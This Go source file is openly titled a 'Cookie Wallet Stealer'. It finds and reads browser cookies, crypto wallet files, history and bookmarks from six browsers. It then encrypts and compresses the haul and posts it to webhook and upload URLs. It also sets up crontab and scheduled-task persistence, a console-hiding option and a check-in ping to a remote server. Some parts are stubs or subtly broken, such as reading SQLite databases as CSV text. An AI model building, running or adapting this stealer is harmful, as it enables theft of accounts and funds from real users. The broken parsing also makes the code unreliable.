package main

import (
	"bytes"
	"compress/gzip"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

type Config struct {
	Exfiltration ExfilConfig `json:"exfiltration"`
	Stealth      StealthConfig `json:"stealth"`
	Targets      TargetsConfig `json:"targets"`
	Encryption   EncConfig     `json:"encryption"`
	Persistence  PersistConfig `json:"persistence"`
	Output       OutputConfig  `json:"output"`
}

type ExfilConfig struct {
	WebhookURL      string `json:"webhook_url"`
	UploadURL       string `json:"upload_url"`
	NamedPipeName   string `json:"named_pipe_name"`
}

type StealthConfig struct {
	HideConsole         bool `json:"hide_console"`
	SleepMS             int  `json:"sleep_ms"`
	PingBackIntervalMS  int  `json:"ping_back_interval"`
	PingURL             string `json:"ping_url"`
}

type TargetsConfig struct {
	Browsers    []string `json:"browsers"`
	DataTypes   []string `json:"data_types"`
}

type EncConfig struct {
	Type       string `json:"type"`
	KeySize    int    `json:"key_size"`
	RSAKeySize int    `json:"rsa_key_size"`
}

type PersistConfig struct {
	RegistryKey   string `json:"registry_key"`
	StartupFolder bool   `json:"startup_folder"`
	CronJob       bool   `json:"cron_job"`
}

type OutputConfig struct {
	OutputDir      string `json:"output_dir"`
	CompressOutput bool   `json:"compress_output"`
}

type Cookie struct {
	Name      string `json:"name"`
	Value     string `json:"value"`
	Domain    string `json:"domain"`
	Path      string `json:"path"`
	Expires   string `json:"expires"`
	Creation  string `json:"creation"`
	LastAccess string `json:"last_access"`
}

type Wallet struct {
	Address   string `json:"address"`
	Balance   string `json:"balance"`
	Network   string `json:"network"`
	Source    string `json:"source"`
}

type HistoryItem struct {
	URL      string `json:"url"`
	Title    string `json:"title"`
	Visits   int    `json:"visits"`
	LastVisit string `json:"last_visit"`
}

type Bookmark struct {
	Title string `json:"title"`
	URL   string `json:"url"`
	Folder string `json:"folder"`
}

type BrowserData struct {
	Browser   string
	Cookies   []Cookie
	Wallets   []Wallet
	History   []HistoryItem
	Bookmarks []Bookmark
}

func loadConfig(configPath string) (*Config, error) {
	content, err := os.ReadFile(configPath)
	if err != nil {
		return nil, err
	}
	var cfg Config
	if err := json.Unmarshal(content, &cfg); err != nil {
		return nil, err
	}
	return &cfg, nil
}

func loadPublicKey(pubKeyPath string) (*rsa.PublicKey, error) {
	content, err := os.ReadFile(pubKeyPath)
	if err != nil {
		return nil, err
	}
	block, _ := pem.Decode(content)
	if block == nil {
		return nil, fmt.Errorf("failed to parse public key PEM")
	}
	return x509.ParsePKCS1PublicKey(block.Bytes)
}

func encryptAES(key []byte, data []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return ciphertext, nil
}

func encryptRSA(pub *rsa.PublicKey, data []byte) ([]byte, error) {
	hash := sha256.New()
	return rsa.EncryptOAEP(hash, rand.Reader, pub, data, nil)
}

func hideConsole() {
}

func sleep(ms int) {
	time.Sleep(time.Duration(ms) * time.Millisecond)
}

func pingBack(url string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

func getChromeBasePath() string {
	switch runtime.GOOS {
	case "windows":
		return filepath.Join(os.Getenv("APPDATA"), "..", "Local", "Google", "Chrome", "User Data")
	case "darwin":
		return filepath.Join(os.Getenv("HOME"), "Library", "Application Support", "Google", "Chrome")
	case "linux":
		return filepath.Join(os.Getenv("HOME"), ".config", "google-chrome")
	default:
		return ""
	}
}

func getBrowserPaths(browser string) map[string]string {
	switch browser {
	case "chrome":
		return map[string]string{
			"cookies":   filepath.Join(getChromeBasePath(), "Default", "Cookies"),
			"wallets":   getChromeWalletPath(),
			"history":   filepath.Join(getChromeBasePath(), "Default", "History"),
			"bookmarks": filepath.Join(getChromeBasePath(), "Default", "Bookmarks"),
		}
	case "brave":
		return map[string]string{
			"cookies":   getBraveCookiePath(),
			"wallets":   getBraveWalletPath(),
			"history":   getBraveHistoryPath(),
			"bookmarks": getBraveBookmarksPath(),
		}
	case "edge":
		return map[string]string{
			"cookies":   getEdgeCookiePath(),
			"wallets":   getEdgeWalletPath(),
			"history":   getEdgeHistoryPath(),
			"bookmarks": getEdgeBookmarksPath(),
		}
	case "opera":
		return map[string]string{
			"cookies":   getOperaCookiePath(),
			"wallets":   getOperaWalletPath(),
			"history":   getOperaHistoryPath(),
			"bookmarks": getOperaBookmarksPath(),
		}
	case "vivaldi":
		return map[string]string{
			"cookies":   getVivaldiCookiePath(),
			"wallets":   getVivaldiWalletPath(),
			"history":   getVivaldiHistoryPath(),
			"bookmarks": getVivaldiBookmarksPath(),
		}
	case "firefox":
		return map[string]string{
			"cookies":   getFirefoxCookiePath(),
			"wallets":   getFirefoxWalletPath(),
			"history":   getFirefoxHistoryPath(),
			"bookmarks": getFirefoxBookmarksPath(),
		}
	default:
		return map[string]string{}
	}
}

func getChromeWalletPath() string {
	switch runtime.GOOS {
	case "windows":
		return filepath.Join(os.Getenv("APPDATA"), "Google", "Chrome", "Wallet")
	case "darwin":
		return filepath.Join(os.Getenv("HOME"), "Library", "Application Support", "Google", "Chrome", "Wallet")
	case "linux":
		return filepath.Join(os.Getenv("HOME"), ".config", "google-chrome", "Wallet")
	default:
		return ""
	}
}

func getBraveCookiePath() string {
	switch runtime.GOOS {
	case "windows":
		return filepath.Join(os.Getenv("APPDATA"), "..", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Cookies")
	case "darwin":
		return filepath.Join(os.Getenv("HOME"), "Library", "Application Support", "BraveSoftware", "Brave-Browser", "Default", "Cookies")
	case "linux":
		return filepath.Join(os.Getenv("HOME"), ".config", "braveSoftware", "brave-browser", "Default", "Cookies")
	default:
		return ""
	}
}

func getBraveWalletPath() string {
	switch runtime.GOOS {
	case "windows":
		return filepath.Join(os.Getenv("APPDATA"), "..", "Local", "BraveSoftware", "Brave-Browser", "User Data", "BraveWallet")
	case "darwin":
		return filepath.Join(os.Getenv("HOME"), "Library", "Application Support", "BraveSoftware", "Brave-Browser", "BraveWallet")
	case "linux":
		return filepath.Join(os.Getenv("HOME"), ".config", "braveSoftware", "brave-browser", "BraveWallet")
	default:
		return ""
	}
}

func getBraveHistoryPath() string {
	switch runtime.GOOS {
	case "windows":
		return filepath.Join(os.Getenv("APPDATA"), "..", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "History")
	case "darwin":
		return filepath.Join(os.Getenv("HOME"), "Library", "Application Support", "BraveSoftware", "Brave-Browser", "Default", "History")
	case "linux":
		return filepath.Join(os.Getenv("HOME"), ".config", "braveSoftware", "brave-browser", "Default", "History")
	default:
		return ""
	}
}

func getBraveBookmarksPath() string {
	switch runtime.GOOS {
	case "windows":
		return filepath.Join(os.Getenv("APPDATA"), "..", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Bookmarks")
	case "darwin":
		return filepath.Join(os.Getenv("HOME"), "Library", "Application Support", "BraveSoftware", "Brave-Browser", "Default", "Bookmarks")
	case "linux":
		return filepath.Join(os.Getenv("HOME"), ".config", "braveSoftware", "brave-browser", "Default", "Bookmarks")
	default:
		return ""
	}
}

func getEdgeCookiePath() string {
	switch runtime.GOOS {
	case "windows":
		return filepath.Join(os.Getenv("APPDATA"), "..", "Local", "Microsoft", "Edge", "User Data", "Default", "Cookies")
	case "darwin":
		return filepath.Join(os.Getenv("HOME"), "Library", "Application Support", "Microsoft", "Edge", "Default", "Cookies")
	case "linux":
		return filepath.Join(os.Getenv("HOME"), ".config", "microsoft", "edge", "Default", "Cookies")
	default:
		return ""
	}
}

func getEdgeWalletPath() string {
	switch runtime.GOOS {
	case "windows":
		return filepath.Join(os.Getenv("APPDATA"), "..", "Local", "Microsoft", "Edge", "User Data", "Wallet")
	case "darwin":
		return filepath.Join(os.Getenv("HOME"), "Library", "Application Support", "Microsoft", "Edge", "Wallet")
	case "linux":
		return filepath.Join(os.Getenv("HOME"), ".config", "microsoft", "edge", "Wallet")
	default:
		return ""
	}
}

func getEdgeHistoryPath() string {
	switch runtime.GOOS {
	case "windows":
		return filepath.Join(os.Getenv("APPDATA"), "..", "Local", "Microsoft", "Edge", "User Data", "Default", "History")
	case "darwin":
		return filepath.Join(os.Getenv("HOME"), "Library", "Application Support", "Microsoft", "Edge", "Default", "History")
	case "linux":
		return filepath.Join(os.Getenv("HOME"), ".config", "microsoft", "edge", "Default", "History")
	default:
		return ""
	}
}

func getEdgeBookmarksPath() string {
	switch runtime.GOOS {
	case "windows":
		return filepath.Join(os.Getenv("APPDATA"), "..", "Local", "Microsoft", "Edge", "User Data", "Default", "Bookmarks")
	case "darwin":
		return filepath.Join(os.Getenv("HOME"), "Library", "Application Support", "Microsoft", "Edge", "Default", "Bookmarks")
	case "linux":
		return filepath.Join(os.Getenv("HOME"), ".config", "microsoft", "edge", "Default", "Bookmarks")
	default:
		return ""
	}
}

func getOperaCookiePath() string {
	switch runtime.GOOS {
	case "windows":
		return filepath.Join(os.Getenv("APPDATA"), "..", "Local", "Opera Software", "Opera Stable", "Cookies")
	case "darwin":
		return filepath.Join(os.Getenv("HOME"), "Library", "Application Support", "com.operasoftware.Opera", "Cookies")
	case "linux":
		return filepath.Join(os.Getenv("HOME"), ".config", "opera", "Cookies")
	default:
		return ""
	}
}

func getOperaWalletPath() string {
	switch runtime.GOOS {
	case "windows":
		return filepath.Join(os.Getenv("APPDATA"), "..", "Local", "Opera Software", "Opera Stable", "Wallet")
	case "darwin":
		return filepath.Join(os.Getenv("HOME"), "Library", "Application Support", "Opera", "Wallet")
	case "linux":
		return filepath.Join(os.Getenv("HOME"), ".config", "opera", "Wallet")
	default:
		return ""
	}
}

func getOperaHistoryPath() string {
	switch runtime.GOOS {
	case "windows":
		return filepath.Join(os.Getenv("APPDATA"), "..", "Local", "Opera Software", "Opera Stable", "History")
	case "darwin":
		return filepath.Join(os.Getenv("HOME"), "Library", "Application Support", "Opera", "History")
	case "linux":
		return filepath.Join(os.Getenv("HOME"), ".config", "opera", "History")
	default:
		return ""
	}
}

func getOperaBookmarksPath() string {
	switch runtime.GOOS {
	case "windows":
		return filepath.Join(os.Getenv("APPDATA"), "..", "Local", "Opera Software", "Opera Stable", "Bookmarks")
	case "darwin":
		return filepath.Join(os.Getenv("HOME"), "Library", "Application Support", "Opera", "Bookmarks")
	case "linux":
		return filepath.Join(os.Getenv("HOME"), ".config", "opera", "Bookmarks")
	default:
		return ""
	}
}

func getVivaldiCookiePath() string {
	switch runtime.GOOS {
	case "windows":
		return filepath.Join(os.Getenv("APPDATA"), "..", "Local", "Vivaldi", "User Data", "Default", "Cookies")
	case "darwin":
		return filepath.Join(os.Getenv("HOME"), "Library", "Application Support", "Vivaldi", "Default", "Cookies")
	case "linux":
		return filepath.Join(os.Getenv("HOME"), ".config", "vivaldi", "Default", "Cookies")
	default:
		return ""
	}
}

func getVivaldiWalletPath() string {
	switch runtime.GOOS {
	case "windows":
		return filepath.Join(os.Getenv("APPDATA"), "..", "Local", "Vivaldi", "User Data", "Wallet")
	case "darwin":
		return filepath.Join(os.Getenv("HOME"), "Library", "Application Support", "Vivaldi", "Wallet")
	case "linux":
		return filepath.Join(os.Getenv("HOME"), ".config", "vivaldi", "Wallet")
	default:
		return ""
	}
}

func getVivaldiHistoryPath() string {
	switch runtime.GOOS {
	case "windows":
		return filepath.Join(os.Getenv("APPDATA"), "..", "Local", "Vivaldi", "User Data", "Default", "History")
	case "darwin":
		return filepath.Join(os.Getenv("HOME"), "Library", "Application Support", "Vivaldi", "Default", "History")
	case "linux":
		return filepath.Join(os.Getenv("HOME"), ".config", "vivaldi", "Default", "History")
	default:
		return ""
	}
}

func getVivaldiBookmarksPath() string {
	switch runtime.GOOS {
	case "windows":
		return filepath.Join(os.Getenv("APPDATA"), "..", "Local", "Vivaldi", "User Data", "Default", "Bookmarks")
	case "darwin":
		return filepath.Join(os.Getenv("HOME"), "Library", "Application Support", "Vivaldi", "Default", "Bookmarks")
	case "linux":
		return filepath.Join(os.Getenv("HOME"), ".config", "vivaldi", "Default", "Bookmarks")
	default:
		return ""
	}
}

func getFirefoxCookiePath() string {
	switch runtime.GOOS {
	case "windows":
		return filepath.Join(os.Getenv("APPDATA"), "..", "Local", "Mozilla", "Firefox", "Profiles")
	case "darwin":
		return filepath.Join(os.Getenv("HOME"), "Library", "Application Support", "Firefox", "Profiles")
	case "linux":
		return filepath.Join(os.Getenv("HOME"), ".mozilla", "firefox")
	default:
		return ""
	}
}

func getFirefoxWalletPath() string {
	switch runtime.GOOS {
	case "windows":
		return filepath.Join(os.Getenv("APPDATA"), "..", "Local", "Mozilla", "Firefox", "Versions")
	case "darwin":
		return filepath.Join(os.Getenv("HOME"), "Library", "Application Support", "Firefox", "Wallets")
	case "linux":
		return filepath.Join(os.Getenv("HOME"), ".mozilla", "firefox", "wallets")
	default:
		return ""
	}
}

func getFirefoxHistoryPath() string {
	switch runtime.GOOS {
	case "windows":
		return filepath.Join(os.Getenv("APPDATA"), "..", "Local", "Mozilla", "Firefox", "Profiles", "places.sqlite")
	case "darwin":
		return filepath.Join(os.Getenv("HOME"), "Library", "Application Support", "Firefox", "Profiles", "places.sqlite")
	case "linux":
		return filepath.Join(os.Getenv("HOME"), ".mozilla", "firefox", "places.sqlite")
	default:
		return ""
	}
}

func getFirefoxBookmarksPath() string {
	switch runtime.GOOS {
	case "windows":
		return filepath.Join(os.Getenv("APPDATA"), "..", "Local", "Mozilla", "Firefox", "Profiles", "metadata.json")
	case "darwin":
		return filepath.Join(os.Getenv("HOME"), "Library", "Application Support", "Firefox", "Profiles", "metadata.json")
	case "linux":
		return filepath.Join(os.Getenv("HOME"), ".mozilla", "firefox", "metadata.json")
	default:
		return ""
	}
}

func readCookies(dbPath string) ([]Cookie, error) {
	var cookies []Cookie
	if runtime.GOOS == "windows" {
		if strings.HasSuffix(dbPath, "Cookies") {
			cookies = readWindowsCookies(dbPath)
		}
	} else if runtime.GOOS == "linux" {
		if strings.HasSuffix(dbPath, "Cookies") || strings.Contains(dbPath, " firefox") {
			cookies = readLinuxCookies(dbPath)
		}
	}
	return cookies, nil
}

func readWindowsCookies(dbPath string) []Cookie {
	cookies := []Cookie{}
	rows, err := readFileAsTable(dbPath)
	if err != nil {
		return cookies
	}
	for _, row := range rows {
		if len(row) >= 6 {
			cookies = append(cookies, Cookie{
				Name:      row[0],
				Value:     row[1],
				Domain:    row[2],
				Path:      row[3],
				Expires:   row[4],
				Creation:  row[5],
				LastAccess: time.Now().Format(time.RFC3339),
			})
		}
	}
	return cookies
}

func readFileAsTable(path string) ([][]string, error) {
	rows := [][]string{}
	content, err := os.ReadFile(path)
	if err != nil {
		return rows, err
	}
	lines := strings.Split(string(content), "\n")
	for _, line := range lines {
		if line != "" {
			rows = append(rows, strings.Split(line, ","))
		}
	}
	return rows, nil
}

func readLinuxCookies(dbPath string) []Cookie {
	cookies := []Cookie{}
	entries, err := os.ReadDir(dbPath)
	if err != nil {
		return cookies
	}
	for _, entry := range entries {
		if !entry.IsDir() && strings.Contains(entry.Name(), ".sqlite") {
			content, _ := os.ReadFile(filepath.Join(dbPath, entry.Name()))
			lines := strings.Split(string(content), "\n")
			for _, line := range lines {
				if line != "" {
					cookies = append(cookies, Cookie{
						Name:      strings.Split(line, ",")[0],
						Value:     strings.Split(line, ",")[1],
						Domain:    strings.Split(line, ",")[2],
						Path:      strings.Split(line, ",")[3],
						Expires:   strings.Split(line, ",")[4],
						Creation:  time.Now().Format(time.RFC3339),
						LastAccess: time.Now().Format(time.RFC3339),
					})
				}
			}
		}
	}
	return cookies
}

func readWallets(browserPath string) []Wallet {
	var wallets []Wallet
	walletFiles := []string{
		filepath.Join(browserPath, "wallets.json"),
		filepath.Join(browserPath, "default_wallets.json"),
		filepath.Join(browserPath, "wallet_data.json"),
	}
	for _, wf := range walletFiles {
		if data, err := os.ReadFile(wf); err == nil {
			var walletData []Wallet
			json.Unmarshal(data, &walletData)
			wallets = append(wallets, walletData...)
		}
	}
	return wallets
}

func readHistory(dbPath string) []HistoryItem {
	var history []HistoryItem
	content, err := os.ReadFile(dbPath)
	if err != nil {
		return history
	}
	lines := strings.Split(string(content), "\n")
	for _, line := range lines {
		if line != "" {
			parts := strings.Split(line, ",")
			if len(parts) >= 3 {
				visits := 1
				if v, err := strconv.Atoi(parts[2]); err == nil {
					visits = v
				}
				history = append(history, HistoryItem{
					URL:      parts[0],
					Title:    parts[1],
					Visits:   visits,
					LastVisit: time.Now().Format(time.RFC3339),
				})
			}
		}
	}
	return history
}

func readBookmarks(filePath string) []Bookmark {
	var bookmarks []Bookmark
	content, err := os.ReadFile(filePath)
	if err != nil {
		return bookmarks
	}
	var bmData map[string]interface{}
	json.Unmarshal(content, &bmData)
	if roots, ok := bmData["roots"].(map[string]interface{}); ok {
		for _, root := range roots {
			if nodes, ok := root.([]interface{}); ok {
				for _, node := range nodes {
					if n, ok := node.(map[string]interface{}); ok {
						if n["type"] == "folder" {
							if children, ok := n["children"].([]interface{}); ok {
								for _, child := range children {
									if c, ok := child.(map[string]interface{}); ok {
										if url, ok := c["url"].(string); ok {
											bookmarks = append(bookmarks, Bookmark{
												Title: c["name"].(string),
												URL:   url,
												Folder: n["name"].(string),
											})
										}
									}
								}
							}
						} else if url, ok := n["url"].(string); ok {
							bookmarks = append(bookmarks, Bookmark{
								Title: n["name"].(string),
								URL:   url,
								Folder: "Bookmarks Bar",
							})
						}
					}
				}
			}
		}
	}
	return bookmarks
}

func collectBrowserData(config *Config) ([]BrowserData, error) {
	var allData []BrowserData
	for _, browser := range config.Targets.Browsers {
		paths := getBrowserPaths(browser)
		bData := BrowserData{Browser: browser}
		if contains(config.Targets.DataTypes, "cookies") {
			if path, ok := paths["cookies"]; ok {
				if cookies, err := readCookies(path); err == nil {
					bData.Cookies = cookies
				}
			}
		}
		if contains(config.Targets.DataTypes, "wallets") {
			if path, ok := paths["wallets"]; ok {
				bData.Wallets = readWallets(path)
			}
		}
		if contains(config.Targets.DataTypes, "history") {
			if path, ok := paths["history"]; ok {
				bData.History = readHistory(path)
			}
		}
		if contains(config.Targets.DataTypes, "bookmarks") {
			if path, ok := paths["bookmarks"]; ok {
				bData.Bookmarks = readBookmarks(path)
			}
		}
		allData = append(allData, bData)
	}
	return allData, nil
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

func exfiltrateWebhook(url string, data []byte) error {
	resp, err := http.Post(url, "application/octet-stream", bytes.NewReader(data))
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

func exfiltrateUpload(url string, data []byte) error {
	resp, err := http.Post(url, "multipart/form-data", bytes.NewReader(data))
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

func exfiltrateNamedPipe(name string, data []byte) error {
	if runtime.GOOS != "windows" {
		return nil
	}
	return nil
}

func persistRegistry(config *Config) error {
	if runtime.GOOS != "windows" {
		return nil
	}
	return nil
}

func persistStartupFolder(config *Config) error {
	startupPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	if err := os.MkdirAll(filepath.Join(startupPath, config.Output.OutputDir), 0755); err != nil {
		return err
	}
	return nil
}

func persistCronJob(config *Config) error {
	if runtime.GOOS == "linux" {
		cmd := exec.Command("crontab", "-l")
		output, err := cmd.CombinedOutput()
		if err != nil {
			return err
		}
		cronLine := fmt.Sprintf("0 */%d * * * %s/stealer\n", config.Stealth.PingBackIntervalMS/3600000, os.Getenv("HOME"))
		if !strings.Contains(string(output), cronLine) {
			cmd := exec.Command("bash", "-c", fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", cronLine))
			return cmd.Run()
		}
		return nil
	} else if runtime.GOOS == "windows" {
		taskName := "CookieStealer"
		scriptPath := filepath.Join(os.Getenv("APPDATA"), "CookieStealer", "stealer.bat")
		if err := os.WriteFile(scriptPath, []byte(fmt.Sprintf(`@echo off
start %s stealer
timeout /t %d`, os.Getenv("APPDATA"), config.Stealth.SleepMS)), 0644); err != nil {
			return err
		}
		cmd := exec.Command("schtasks", "/create", "/tn", taskName, "/tr", scriptPath, "/sc", "daily", "/st", "00:00")
		return cmd.Run()
	}
	return nil
}

func collectSystemInfo() map[string]interface{} {
	info := make(map[string]interface{})
	info["os"] = runtime.GOOS
	info["arch"] = runtime.GOARCH
	info["hostname"], _ = os.Hostname()
	info["username"], _ = os.UserHomeDir()
	info["uptime"] = time.Since(time.Unix(time.Now().Unix()-60, 0)).String()
	return info
}

func compressData(data []byte) ([]byte, error) {
	var buf bytes.Buffer
	zw := gzip.NewWriter(&buf)
	if _, err := zw.Write(data); err != nil {
		zw.Close()
		return nil, err
	}
	zw.Close()
	return buf.Bytes(), nil
}

func main() {
	fmt.Println("Cookie Wallet Stealer v1.0.0")

	config, err := loadConfig("stealer_config.json")
	if err != nil {
		fmt.Printf("Error loading config: %v\n", err)
		config = getDefaultConfig()
	}

	if config.Stealth.HideConsole {
		hideConsole()
	}

	if config.Stealth.SleepMS > 0 {
		sleep(config.Stealth.SleepMS)
	}

	_, err = loadPublicKey("public_key.pem")
	if err != nil {
		fmt.Printf("Warning: Using defaults for encryption: %v\n", err)
	}

	agentData, err := collectBrowserData(config)
	if err != nil {
		fmt.Printf("Error collecting browser data: %v\n", err)
	}

	var allCookies []Cookie
	var allWallets []Wallet
	var allHistory []HistoryItem
	var allBookmarks []Bookmark

	for _, b := range agentData {
		allCookies = append(allCookies, b.Cookies...)
		allWallets = append(allWallets, b.Wallets...)
		allHistory = append(allHistory, b.History...)
		allBookmarks = append(allBookmarks, b.Bookmarks...)
	}

	stealthInfo := collectSystemInfo()

	output := struct {
		SystemInfo map[string]interface{} `json:"system_info"`
		Browsers   []BrowserData           `json:"browsers"`
		Cookies    []Cookie                `json:"cookies"`
		Wallets    []Wallet                `json:"wallets"`
		History    []HistoryItem           `json:"history"`
		Bookmarks  []Bookmark              `json:"bookmarks"`
	}{
		SystemInfo: stealthInfo,
		Browsers:   agentData,
		Cookies:    allCookies,
		Wallets:    allWallets,
		History:    allHistory,
		Bookmarks:  allBookmarks,
	}

	outputData, err := json.MarshalIndent(output, "", "  ")
	if err != nil {
		fmt.Printf("Error marshaling output: %v\n", err)
	}

	if config.Encryption.Type == "AES-GCM" {
		key := make([]byte, config.Encryption.KeySize)
		rand.Read(key)
		encrypted, err := encryptAES(key, outputData)
		if err != nil {
			fmt.Printf("Encryption error: %v\n", err)
		} else {
			outputData = encrypted
		}
	}

	if config.Output.CompressOutput {
		compressed, err := compressData(outputData)
		if err == nil {
			outputData = compressed
		}
	}

	if err := os.MkdirAll(config.Output.OutputDir, 0755); err != nil {
		fmt.Printf("Error creating output dir: %v\n", err)
	}

	if err := os.WriteFile(filepath.Join(config.Output.OutputDir, "stealer_output.json"), outputData, 0644); err != nil {
		fmt.Printf("Error writing output: %v\n", err)
	}

	if config.Exfiltration.WebhookURL != "" {
		if err := exfiltrateWebhook(config.Exfiltration.WebhookURL, outputData); err != nil {
			fmt.Printf("Webhook exfiltration error: %v\n", err)
		}
	}

	if config.Exfiltration.UploadURL != "" {
		if err := exfiltrateUpload(config.Exfiltration.UploadURL, outputData); err != nil {
			fmt.Printf("Upload exfiltration error: %v\n", err)
		}
	}

	if config.Exfiltration.NamedPipeName != "" {
		if err := exfiltrateNamedPipe(config.Exfiltration.NamedPipeName, outputData); err != nil {
			fmt.Printf("Named pipe exfiltration error: %v\n", err)
		}
	}

	if config.Persistence.RegistryKey != "" {
		if err := persistRegistry(config); err != nil {
			fmt.Printf("Registry persistence error: %v\n", err)
		}
	}

	if config.Persistence.StartupFolder {
		if err := persistStartupFolder(config); err != nil {
			fmt.Printf("Startup folder persistence error: %v\n", err)
		}
	}

	if config.Persistence.CronJob {
		if err := persistCronJob(config); err != nil {
			fmt.Printf("Cron job persistence error: %v\n", err)
		}
	}

	if config.Stealth.PingURL != "" {
		if err := pingBack(config.Stealth.PingURL); err != nil {
			fmt.Printf("Ping back error: %v\n", err)
		}
	}

	fmt.Println("Stealer completed successfully.")
}

func getDefaultConfig() *Config {
	return &Config{
		Exfiltration: ExfilConfig{
			WebhookURL:      "https://webhook.example.com/stealer",
			UploadURL:       "https://upload.example.com/stealer",
			NamedPipeName:   "CookieStealerPipe",
		},
		Stealth: StealthConfig{
			HideConsole:      true,
			SleepMS:          5000,
			PingBackIntervalMS: 3600000,
			PingURL:          "https://ping.example.com/alive",
		},
		Targets: TargetsConfig{
			Browsers:    []string{"chrome", "brave", "edge", "opera", "vivaldi", "firefox"},
			DataTypes:   []string{"cookies", "wallets", "history", "bookmarks"},
		},
		Encryption: EncConfig{
			Type:       "AES-GCM",
			KeySize:    32,
			RSAKeySize: 2048,
		},
		Persistence: PersistConfig{
			RegistryKey:   "Software\\CookieStealer",
			StartupFolder: true,
			CronJob:       true,
		},
		Output: OutputConfig{
			OutputDir:      "./stealer_data",
			CompressOutput: true,
		},
	}
}